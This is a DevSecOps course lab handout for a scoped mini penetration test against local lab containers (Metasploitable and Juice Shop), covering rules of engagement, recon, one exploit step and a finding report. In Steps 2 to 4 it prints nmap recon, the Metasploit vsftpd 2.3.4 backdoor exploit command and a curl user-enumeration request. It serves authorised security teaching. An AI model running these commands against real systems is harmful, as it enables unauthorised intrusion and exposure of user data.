# Lab 6: Scoped Mini Pen-Test
### A grey-box engagement against the lab targets — recon to report
**DevSecOps — Module 6 of 9**

---

## Lab overview

### Objectives

- Read and respect a written scope and Rules of Engagement
- Use recon, vulnerability analysis, and a single exploit step
- Capture evidence and write a one-page finding using the report template

### Prerequisites

- Labs 1, 2, 4 completed; targets running on your Cloud9 instance

> ⏱ **Duration:** ~45 minutes
> 👥 **Pair:** Yes

---

## Your engagement letter

> **Scope and Rules of Engagement — DevSecOps Lab 6**
>
> **Tester:** *(your pair)*
>
> **In scope:**
> - Your own Cloud9 instance: the Metasploitable & Juice Shop containers on the `devsecops-lab` Docker network — *attacker may exploit any service exposed*
>
> **Out of scope:**
> - Any **other** student's Cloud9 instance — even on the same shared AWS account
> - The host EC2 instance (Cloud9 AMI itself)
> - Any AWS resource outside the lab containers
> - Denial-of-service techniques
>
> **Time window:** the duration of this lab session
>
> **Allowed techniques:** recon (`nmap`, banner grabbing), web fuzzing (within Juice Shop), single-shot exploitation modules from Metasploit
>
> **Prohibited techniques:** any destructive payload, lateral movement to host or AWS APIs, persistence
>
> **Stop conditions:** if you cannot recover the lab containers after a step, stop and notify the instructor
>
> **Authorising signature:** *(instructor signs at start of lab)*

Read it. Initial it. **You may not exceed this scope.** Pivoting from the Metasploitable container to the Cloud9 host or to AWS APIs would constitute "out of scope" — do not attempt it.

---

## Step 1: Pick a target & objective (5 min)

Pair, then choose **one** target and **one** objective. Examples:

| Target | Objective |
|---|---|
| Metasploitable | Get a remote shell via a known service-level vuln |
| Metasploitable | Read `/etc/passwd` via a vulnerable web component |
| Juice Shop | Enumerate all admin emails via the user API |
| Juice Shop | Demonstrate price tampering on a basket |

Write your choice in `~/environment/devsecops-work/lab5-plan.md`.

---

## Step 2: Recon (10 min)

Re-use Lab 2 outputs if you have them. Otherwise, from the Cloud9 terminal:

```bash
TARGET_IP=$(awk -F'|' '/Metasploitable IP/ {gsub(/^[ \t]+|[ \t]+$/, "", $3); print $3}' ~/devsecops-lab-env.md)

# Service & version sweep
nmap -Pn -sV -sC -oN ~/environment/devsecops-work/lab5-recon.txt $TARGET_IP

# For Juice Shop:
curl -sI http://localhost:8080
```

Identify **one** version-fingerprinted service likely vulnerable. Record:

- Service & version
- Why you think it's exploitable
- Your plan in ≤ 5 bullets

---

## Step 3: Vulnerability analysis (10 min)

Without exploiting yet, look up the vulnerability.

For Metasploitable services, search Metasploit:

```bash
docker run --rm -it \
  --network devsecops-lab \
  metasploitframework/metasploit-framework:latest \
  ./msfconsole -q -x "search type:exploit name:vsftpd; exit"
```

For Juice Shop, look at the OWASP Top 10 categories you covered in Lab 5.

Read the public CVE / Exploit-DB description — understand *what* the exploit does *before* running it.

> ⚠️ Re-read scope before exploiting. If your plan strays, narrow it.

---

## Step 4: Exploit — *one* step (10 min)

Run **one** carefully chosen exploit. Capture:

- The exact command(s)
- The payload / request body
- The response that proves it worked

Example for Metasploitable, FTP backdoor (using the Metasploit container):

```bash
docker run --rm -it \
  --network devsecops-lab \
  metasploitframework/metasploit-framework:latest \
  ./msfconsole -q -x "
    use exploit/unix/ftp/vsftpd_234_backdoor;
    set RHOSTS metasploitable;
    run;
  "
```

Or for Juice Shop, a user enumeration:

```bash
curl -s http://localhost:8080/api/Users | jq '.data[].email' | head
```

> ✅ **Checkpoint:** you have one concrete piece of evidence that proves the issue.

---

## Step 5: Stop. Don't pivot. (1 min)

You proved impact. **Stop here.** Do not:

- Run additional modules "for fun"
- Move laterally to the Cloud9 host or other students' instances
- Touch AWS APIs

Close any sessions you opened (`exit` from a shell, kill the Metasploit container).

This is the most important habit of a professional pen tester.

---

## Step 6: Write a one-page finding (10 min)

Save `~/environment/devsecops-work/lab5-finding.md`:

```markdown
# Finding — <short title>

**Engagement:** DevSecOps Lab 6
**Tester:** <pair>
**Date:** <today>
**Severity:** Critical | High | Medium | Low (pick one + justify)
**OWASP / CVE:** A01 / A03 / CVE-XXXX-YYYY
**Target:** <hostname & port or URL>

## Summary
One sentence. What can the attacker do, and why does it matter?

## Reproduction steps
1. ...
2. ...
3. ...

## Evidence
\`\`\`
<paste the screenshot or terminal output that proves it>
\`\`\`

## Recommended fix
- Concrete change in code/config
- Tooling that would catch this earlier (SAST? SCA? Auth tests?)

## Out-of-scope notes
Things you saw but did not test, per RoE.
```

> ✅ **Checkpoint:** the finding is reproducible by another engineer using only your write-up.

---

## Step 7: Cross-pair walkthrough (optional, 5 min)

Pair with another team. Each tester walks the other through their finding aloud. Other team plays the developer asking "What do I actually change?"

If the answer is fuzzy, sharpen the **Recommended fix** section.

---

## Cleanup

Targets stay running.

---

## Common mistakes

| Mistake | Why it matters |
|---|---|
| "I'll just try one more module" | Out of scope unless your RoE says yes |
| Touching AWS APIs from inside the exploit | Way out of scope — could affect the shared account |
| Running the same exploit dozens of times | Filling logs, causing instability — bad form |
| Skipping the report | Your output **is** the report; the exploit is just a step |
